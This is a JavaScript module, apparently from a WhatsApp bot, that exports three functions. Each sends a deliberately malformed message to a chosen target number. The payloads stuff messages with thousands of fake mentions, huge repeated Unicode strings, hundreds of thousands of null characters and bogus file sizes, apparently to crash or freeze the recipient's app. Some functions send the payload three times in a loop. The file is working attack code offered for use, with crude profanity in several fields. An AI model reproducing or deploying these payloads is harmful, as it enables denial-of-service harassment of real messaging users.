exports.beta2 = async (viper, target, cct = true, Ptcp = true) => {
const crypto = require('crypto')
const fs = require('fs')
const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
const jids = `_*~@13135550002~*_\n`.repeat(10200);
const ui = 'ꦽ'.repeat(1500);

    for (let i = 0; i < 3; i++) {
    await viper.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: o,
         },
         hasMediaAttachment: true,
        },

									body: { text: '𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚' + ui + jids },
									contextInfo: {
										mentionedJid: ['13135550002@s.whatsapp.net'],
										mentions: ['13135550002@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: o,
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
	}


exports.beta1 = async (viper, target) => {
const crypto = require('crypto');
const fs = require('fs'); // Pastikan fs di-import
const o = fs.readFileSync(`./database/lib/viper/o.jpg`);
const stanza = [
        {
            attrs: { biz_bot: '1' },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];

    for (let i = 0; i < 3; i++) {
        const messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Hajimemaste Watashiwa 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦽ".repeat(40000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: viper.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "Bro can your please help me",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚 \"👋\"",
                    footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(800000),
                            buttonText: {
                                displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: o,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/CashClipBot",
buttonTitle: "kontol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! 𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚 - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
thumbnail: o,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "kontol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363222395675670@newsletter",
serverMessageId: 1,
newsletterName: `𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}
        await viper.relayMessage(target, messagePayload, {
            additionalNodes: stanza,
            participant: { jid: target }
        });
    }
};

exports.buk1 = async (viper, target, cct = true, Ptcp = true) => {
const crypto = require('crypto')
const fs = require('fs')
const o = fs.readFileSync(`./database/lib/viper/o.jpg`)

    try {
                const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "ꦾ".repeat(120000),
                        jpegThumbnail: o,
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                    },
                ],
            },
        };

        await viper.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
};